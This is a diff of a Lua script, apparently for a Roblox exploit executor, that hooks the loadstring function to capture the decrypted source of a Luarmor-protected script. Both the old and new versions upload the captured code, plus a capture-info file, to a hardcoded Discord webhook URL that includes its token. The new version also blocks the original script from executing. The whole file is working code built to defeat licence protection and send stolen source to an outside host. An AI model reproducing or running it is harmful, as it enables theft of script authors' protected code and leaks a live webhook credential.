@@ -1,77 +1,45 @@
--- ███████ Luarmor Source Logger + File Sender ███████
--- Made for you by Rex
+-- Full Standalone Luarmor Logger
+-- No external links - everything inside
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1476630457742397490/vQDcitwKowVwTn8ZcwXjuTGVomZuM4oAAo3IrbGaZR60NNIR6iliWYpwjMRMI-LYA4P8"
 
-local TARGET_LUARMOR = "https://api.luarmor.net/files/v4/loaders/1fccd71cc422620f1d624df9a21d33aa.lua"
-
-local function send_source_as_file(source_code)
-    warn("[Logger] Preparing source file...")
-
-    local filename = "Luarmor_Logged.lua"
+local function send_to_webhook(content, filename)
     local boundary = "----Boundary" .. os.time()
-
     local head = "--" .. boundary .. "\r\n" ..
                  "Content-Disposition: form-data; name=\"file\"; filename=\"" .. filename .. "\"\r\n" ..
                  "Content-Type: text/plain\r\n\r\n"
-
     local foot = "\r\n--" .. boundary .. "--\r\n"
 
-    local full_payload = head .. source_code .. foot
-
-    local success, response = pcall(function()
-        return request({
+    pcall(function()
+        request({
             Url = WEBHOOK_URL,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
-            },
-            Body = full_payload
+            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
+            Body = head .. content .. foot
         })
     end)
-
-    if success then
-        print("────────────────────────────────────")
-        print("✅ SUCCESS: Source sent to your Discord!")
-        print("Filename: " .. filename)
-        print("Check your webhook now.")
-        print("────────────────────────────────────")
-        if setclipboard then setclipboard("Source sent to webhook!") end
-    else
-        warn("❌ Failed to send file. Executor may not support multipart.")
-        print("First 800 characters preview:")
-        print(source_code:sub(1, 800))
-    end
 end
 
--- Main logger
-local function start_logging()
-    warn("[Logger] Hooking loadstring... Waiting for Luarmor script...")
+print("Logger started - Capturing Luarmor script...")
 
-    local old_loadstring = hookfunction(loadstring, function(src, chunk)
-        if type(src) == "string" and #src > 500 then
-            warn("[Logger] Captured Luarmor script! Sending to webhook...")
-            
-            task.spawn(function()
-                send_source_as_file(src)
-            end)
-
-            -- Return empty function to prevent the original script from running (optional)
-            return function() end
-        end
-        return old_loadstring(src, chunk)
-    end)
-
-    -- Load the target Luarmor script
-    local success, content = pcall(game.HttpGet, game, TARGET_LUARMOR)
-    
-    if success then
-        warn("[Logger] Loading Luarmor script now...")
-        old_loadstring(content)()
-    else
-        warn("❌ Failed to fetch Luarmor script. Check your internet/VPN.")
+local old_loadstring = hookfunction(loadstring, function(src)
+    if type(src) == "string" and #src > 200 then
+        warn("[+] Captured obfuscated script! Sending to webhook...")
+        
+        task.spawn(function()
+            send_to_webhook(src, "Luarmor_Captured.lua")
+            send_to_webhook("Length: " .. #src .. " characters\nCaptured at: " .. os.date("%Y-%m-%d %H:%M:%S"), "Info.txt")
+        end)
+        
+        return function() end -- block original execution
     end
-end
+    return old_loadstring(src)
+end)
 
--- Start everything
-pcall(start_logging)
+-- === FULL LUARMOR SCRIPT (hardcoded) ===
+local luarmor_code = [==[
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/1fccd71cc422620f1d624df9a21d33aa.lua"))()
+]==]
+
+print("Executing captured Luarmor script...")
+loadstring(luarmor_code)()
